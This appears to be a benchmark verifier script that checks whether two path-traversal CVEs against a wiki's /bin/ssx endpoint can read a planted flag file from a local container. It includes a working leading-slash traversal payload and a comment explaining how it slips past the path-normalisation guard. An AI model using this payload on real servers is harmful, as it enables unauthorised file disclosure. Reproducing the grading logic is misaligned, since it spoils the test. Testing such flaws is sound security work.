#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0=flag in ssx body  10=blocked/no flag  20=env  30=args
#
# Seed = CVE-2025-55748 plain `../` via /bin/ssx resource= (original_poc).
# Residual = CVE-2026-23734 leading-slash `/../../WEB-INF/pcb_flag.txt`.
# Inline literals only; never reference heldout files.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

SVC="$VERSION"
PORT=""
for _ in $(seq 1 60); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    port "$SVC" 8080 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 8 \
      "http://127.0.0.1:${PORT}/bin/ssx/Main/WebHome?resource=pcb-ready-check&minify=false" 2>/dev/null || true)"
    if [[ "$code" =~ ^(200|404)$ ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published ${SVC}:8080 / ssx not ready" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'method': 'GET'}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual（CVE-2026-23734）: V1 ClassLoaderUtils.normalize() rejects plain
  # `../` (startsWith("../")), but a LEADING SLASH makes the path absolute so
  # normalize() collapses at FS root and does not start with "../". The guard
  # returns the original string; Tomcat ignores the leading slash and still
  # resolves `../../` from ROOT/WEB-INF/classes/. Inline only; no heldout files.
  CAND='{"probe_id":"cve-2026-23734-leading-slash-traversal","method":"GET","path":"/bin/ssx/Main/WebHome?resource=/../../WEB-INF/pcb_flag.txt&minify=false"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi

"$PY" - "$OUT" "$RUN_FLAG" "$MODE" "$PORT" <<'PY'
import json, sys
raw, flag, mode, port = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
try:
    d = json.loads(raw)
except Exception:
    sys.stderr.write("verify: non-JSON probe output\n%s\n" % raw[:400])
    sys.exit(20)
body = d.get("body") or ""
err = d.get("error")
if err and flag not in body:
    el = str(err).lower()
    if any(x in el for x in ("connect", "refused", "timeout", "not found", "curl", "failed to")):
        sys.stderr.write("verify: probe error: %s\n" % str(err)[:300])
        sys.exit(20)
hit = bool(flag) and flag in body
print("mode=%s port=%s status=%s hit=%s" % (mode.lstrip("-"), port, d.get("status"), hit))
print((body or "")[:500])
sys.exit(0 if hit else 10)
PY
